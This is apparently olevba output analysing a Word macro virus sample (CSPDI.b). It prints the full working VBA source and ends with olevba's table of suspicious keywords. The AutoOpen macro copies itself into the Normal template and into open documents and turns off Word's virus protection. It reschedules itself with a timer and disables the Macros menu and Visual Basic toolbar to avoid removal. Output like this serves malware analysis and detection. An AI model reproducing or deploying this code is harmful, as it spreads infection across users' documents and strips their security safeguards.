olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CSPDI.b-441714920cb11a357ff3c9e0ee2848dfc260b901
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CSPDI.b-441714920cb11a357ff3c9e0ee2848dfc260b901 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.CSPDI.b-441714920cb11a357ff3c9e0ee2848dfc260b901 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Sub MAIN()

Dim MyFile$
Dim OkExist
Dim TemplateName$
Dim internal
Dim xItem
Dim t
Dim s

'设置错误陷阱
On Error Resume Next

'获取活动文件名
If ActiveDocument.Path = "" Then
  MyFile$ = ActiveDocument.Name
Else
  MyFile$ = ActiveDocument.Path + "\" + ActiveDocument.Name
End If

If MyFile$ = "" Then GoTo Bye

'整点出现日期时间信息
t = Format(Time, "hhmmss")
If Mid(t, 3, 2) = "00" And Not (Format(Date, "yyyy") = "1998" And Val(Format(Date, "mm")) < 9) Then
  MsgBox s, vbSystemModal, "CPSDI"
  'MsgBox Format(Date, "dddd,yyyy mmm dd") + "日 " + Format(Time, "hh") + "时", vbSystemModal, "我的提醒"
End If


' 在通用模板中查找是否有AutoOpen宏
OkExist = 0
For Each xItem In NormalTemplate.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

' 获取通用模板的文件名
TemplateName$ = NormalTemplate.Path + "\" + NormalTemplate.Name

'设置通用模板的文件属性为档案并解除其病毒防护功能
SetAttr TemplateName$, vbNormal
Options.VirusProtection = False

' 拷贝AutoOpen宏到通用模板
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

' 在活动文档中查找是否有AutoOpen宏
OkExist = 0
For Each xItem In ActiveDocument.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

'拷贝AutoOpen宏到活动文档
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

Bye:

' 设置自动运行AutoOpen宏的计时器
internal = "00:" + Str(10 - Val(Mid(t, 4, 1)))
Application.OnTime When:=Now + TimeValue(internal) - TimeValue("00:00:" + Right(t, 2)), Name:="AutoOpen", Tolerance:=60
DisableMacroMenu
DisableVBTools
End Sub
Public Sub DisableMacroMenu()
'使工具菜单中的宏命令组失去作用
Dim cb, xItem, xxItem, xxxItem
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Menu Bar" Then
    For Each xItem In cb.Controls
      If xItem.Caption = "工具(&T)" Then
        For Each xxItem In xItem.Controls
          If xxItem.Caption = "宏(&M)" Then
            'xxItem.Enabled = True
            For Each xxxItem In xxItem.Controls
                xxxItem.Enabled = False
            Next xxxItem
            Exit Sub
          End If
        Next xxItem
      End If
    Next xItem
  End If
Next cb
End Sub
Public Sub DisableVBTools()
'使工具栏中的Visual Basic失去作用
Dim cb
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Visual Basic" Then
     cb.Enabled = False
     Exit For
  End If
Next cb
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

